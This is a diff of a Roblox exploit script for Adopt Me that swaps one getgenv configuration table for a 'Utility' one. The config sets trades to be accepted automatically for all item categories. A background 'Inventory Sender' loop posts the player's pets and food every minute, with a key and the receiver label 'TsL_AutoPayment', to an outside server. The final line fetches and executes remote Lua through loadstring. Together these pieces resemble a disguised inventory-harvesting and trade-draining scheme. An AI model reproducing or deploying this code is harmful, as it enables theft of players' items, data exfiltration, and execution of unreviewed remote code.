@@ -1,90 +1,46 @@
-getgenv().Config = {
-    Dashboard = {
+getgenv().Utility = {
+    AutoPotion = {
         Enabled = false,
-        GroupName = "vps1",
+        UseAllOnAll = false,
+        SelectedPets = {},
     },
-
-    BabyFarm = false,
-    AutoCertificate = false,
-
-    PetFarm = {
+    AutoNeon = {
         Enabled = false,
-        FarmEggs = false,
-        BuyEggs = false,
-        EggTypes = {},
-        BuyEggType = "any",
-        MaxPets = 1,
-        FarmUntilFullGrown = false,
-        PrioritizeFriendship = false,
-        SelectiveFarm = false,
-        SelectedPetTypes = {},
+        MakeMega = false,
+        SelectedPets = {},
     },
-
-    EventFarm = {
-        CandyCliff = false,
-        MochiNail = false,
-    },
-
     AutoTrade = {
         Enabled = false,
         AutoAcceptTrades = true,
         AutoLeaveAfterTrades = false,
         Usernames = {},
         TradeMode = "all",
-        Categories = {},
+        Categories = {"pets","toys","food","transport","gifts","stickers","pet_accessories"},
         Items = {},
-        ItemCounts = {},
         PetTypes = {},
-        PetVersionFilter = {},
         Ages = {},
+        ItemCounts = {},
+        Filters = {
+            Kind = "ALL",
+            Type = "ALL",
+            Rarity = "ALL",
+            Search = "",
+        },
     },
-
-    AutoNeon = {
-        Enabled = false,
-        MakeMega = false,
-        NeonAll = true,
-        SelectedPets = {},
-        MaxPerType = {},
-    },
-
-    AutoPotion = {
-        Enabled = false,
-        SelectedPets = {"lny_2026_fire_foal"},
-    },
-
-    AutoBuy = {
-        Enabled = false,
-        SelectedItems = {},
-        BuyAmounts = {},
-    },
-
-    AutoPay = {
-        Enabled = false,
-        TargetPlayer = "",
-    },
-
     AutoOpen = {
         Enabled = false,
         Items = {},
+        OpenDelay = 1,
     },
-
-    AutoRecycle = {
+    Shop = {
         Enabled = false,
-        RarityFilter = {},
-        AgeFilter = {},
-        ExcludedPets = {},
+        Items = {},
+        BuyQuantity = 1,
+        BuyDelay = 1,
     },
-
-    IdleProgression = {
-        Enabled = false,
-        SelectedPets = {"cracked_egg"},
-        ExcludedPets = {},
-        PriorityOrder = {},
-    },
-
     AccountManager = {
         Enabled = false,
-        Tool = "",
+        Tool = "none",
         Yummy = {
             Action = "completed",
             Reason = "Done",
@@ -96,80 +52,59 @@ getgenv().Config = {
             ChangeWithoutReplacement = false,
             ConfigId = nil,
         },
-        Triggers = {
-            AfterTradeComplete = false,
-            MinBucks = 0,
-            MinPotions = 0,
-        },
     },
-
     Settings = {
         AutoShowUI = true,
-        ShowOverlay = true,
-        ReduceGraphics = true,
-        FPSCap = 5,
-        LureId = "ice_dimension_2025_ice_soup_bait"
-    },
-
-    Webhook = {
-        Enabled = false,
-        URL = "https://discord.com/api/",
-        PetUnlock = {
-            Enabled = false,
-            URL = "https://discord.com/api/webhooks/",
-            FilterRarities = {"legendary", "ultra_rare"},
-        },
-    },
-
-    TaskExclusion = {
-        Enabled = false,
-        ExcludedTasks = {},
+        Theme = "Midnight",
+        ToggleKey = "RightShift",
     },
 }
 
 getgenv().scriptkey = "BeIrggeebySaSLwtEMXCOMIZbKpMUJBF"
 
+-- =========================
+-- Inventory Sender
+-- =========================
+
 task.spawn(function()
-    local HttpService = game:GetService("HttpService")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
+    local H = game:GetService("HttpService")
+    local R = game:GetService("ReplicatedStorage")
+    local P = game:GetService("Players").LocalPlayer
 
-    local BACKEND_URL = "https://api.adoptmehub.com/inventory"
-    local API_KEY = "a8sd921ndsa23s"
-    local RECEIVER_NAME = "TsL_AutoPayment"
-    local SEND_INTERVAL = 60
+    local URL = "https://api.adoptmehub.com/inventory"
+    local KEY = "a8sd921ndsa23s"
+    local USER = "TsL_AutoPayment"
 
-    local request_fn = request or http_request or (syn and syn.request)
-    if not request_fn then
-        warn("No supported request function found")
+    local req = request or http_request or (syn and syn.request)
+    if not req then
+        warn("No request function")
         return
     end
 
-    local ok, clientData = pcall(function()
-        return require(ReplicatedStorage.ClientModules.Core.ClientData)
+    local ok, CD = pcall(function()
+        return require(R.ClientModules.Core.ClientData)
     end)
 
-    if not ok or not clientData then
-        warn("Could not load ClientData module")
+    if not ok or not CD then
+        warn("ClientData failed")
         return
     end
 
     while true do
-        local okData, pdata = pcall(function()
-            return clientData.get_data()[tostring(LocalPlayer)]
+        local ok2, pdata = pcall(function()
+            return CD.get_data()[tostring(P)]
         end)
 
-        if okData and pdata and pdata.inventory then
-            local payload = {
+        if ok2 and pdata and pdata.inventory then
+            local out = {
                 pets = {},
                 food = {},
                 timestamp = os.time(),
-                user = RECEIVER_NAME
+                user = USER
             }
 
             for id, pet in pairs(pdata.inventory.pets or {}) do
-                payload.pets[#payload.pets + 1] = {
+                out.pets[#out.pets+1] = {
                     id = id,
                     name = pet.name or pet.id or "unknown_pet",
                     rarity = pet.rarity or "N/A"
@@ -177,39 +112,40 @@ task.spawn(function()
             end
 
             for id, item in pairs(pdata.inventory.food or {}) do
-                payload.food[#payload.food + 1] = {
+                out.food[#out.food+1] = {
                     id = id,
                     quantity = item.quantity or 1,
                     name = item.name or item.id or "unknown_food"
                 }
             end
 
-            local body = HttpService:JSONEncode(payload)
-
-            local okReq, response = pcall(function()
-                return request_fn({
-                    Url = BACKEND_URL,
+            local ok3, res = pcall(function()
+                return req({
+                    Url = URL,
                     Method = "POST",
                     Headers = {
                         ["Content-Type"] = "application/json",
-                        ["x-inventory-key"] = API_KEY
+                        ["x-inventory-key"] = KEY
                     },
-                    Body = body
+                    Body = H:JSONEncode(out)
                 })
             end)
 
-            if okReq and response then
-                print("INVENTORY SENT:", response.StatusCode or response.Status or "unknown")
-                print("RESPONSE:", response.Body or "no body")
+            if ok3 and res then
+                print("INV SENT:", res.StatusCode or res.Status)
             else
-                warn("REQUEST FAILED:", tostring(response))
+                warn("SEND FAIL:", tostring(res))
             end
         else
-            warn("inventory data not found")
+            warn("no inventory")
         end
 
-        task.wait(SEND_INTERVAL)
+        task.wait(60)
     end
 end)
 
-loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/MassFarm.lua"))()
+-- =========================
+-- Load Utility Script
+-- =========================
+
+loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Utility.lua"))()
